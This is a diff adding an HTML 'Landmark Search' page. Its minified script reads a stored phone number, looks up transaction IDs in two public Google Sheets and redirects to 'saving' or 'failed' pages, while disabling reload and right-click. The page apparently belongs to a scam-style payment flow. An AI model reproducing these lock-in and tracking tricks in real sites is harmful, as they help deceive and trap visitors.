@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Landmark Search</title>
+   </head>
+<body> <script>
+const sheetUrl1="https://docs.google.com/spreadsheets/d/1Red8hzcgWsABq0QwQs17PL4xE67acmiCXcbZEBF7aSY/gviz/tq?tqx=out:csv",sheetUrl2="https://docs.google.com/spreadsheets/d/1wp6FU8-C_1lP57gLIYmy57idWIjvcxO549i3rQzmv7w/gviz/tq?tqx=out:csv";async function fetchSheetData(e){try{let t=await fetch(e),a=await t.text();return parseCSV(a)}catch(o){console.error("Error fetching the sheet:",o),window.location.href="404.html"}}function parseCSV(e){let t=e.split("\n").filter(e=>""!==e.trim());return t.map(e=>e.split(/,(?=(?:(?:[^"]*"){2})*[^"]*$)/).map(e=>e.replace(/^"|"$/g,"").trim()))}async function searchInSheet(){let e=JSON.parse(localStorage.getItem("addressData"))?.landmark;if(console.log("Search Value:",e),!e){console.error("Search value missing!"),window.location.href="404.html";return}let t=await fetchSheetData("https://docs.google.com/spreadsheets/d/1Red8hzcgWsABq0QwQs17PL4xE67acmiCXcbZEBF7aSY/gviz/tq?tqx=out:csv"),a=await fetchSheetData("https://docs.google.com/spreadsheets/d/1wp6FU8-C_1lP57gLIYmy57idWIjvcxO549i3rQzmv7w/gviz/tq?tqx=out:csv");if(console.log("Sheet1 Data:",t),console.log("Sheet2 Data:",a),!t||!a){console.error("Failed to fetch sheets.");return}let o=null;for(let r=t.length-1;r>=0;r--)if(console.log(`Sheet1 Row ${r}:`,t[r]),t[r][1]===e){o=t[r][2],console.log("Transaction ID Found in Sheet1:",o),localStorage.setItem("tnxid",o),localStorage.setItem("phonenmb",e);break}if(!o){console.warn("Phone number not found in Sheet1."),window.location.href="404.html";return}let n=!1;for(let s=1;s<a.length;s++)if(console.log(`Sheet2 Row ${s}:`,a[s]),a[s][9]===o){console.log("Transaction ID Found in Sheet2:",o),n=!0;break}n?(console.log("Redirecting to failed.html"),window.location.href="failedx.html"):(console.log("Redirecting to saving.html"),window.location.href="saving.html")}window.addEventListener("keydown",e=>{("F5"===e.key||e.ctrlKey&&"r"===e.key||e.metaKey&&"r"===e.key)&&(e.preventDefault(),alert("Reload is disabled while processing."))}),window.addEventListener("contextmenu",e=>{e.preventDefault()}),window.onload=()=>{searchInSheet()};
+  </script>
+</body>
+</html>
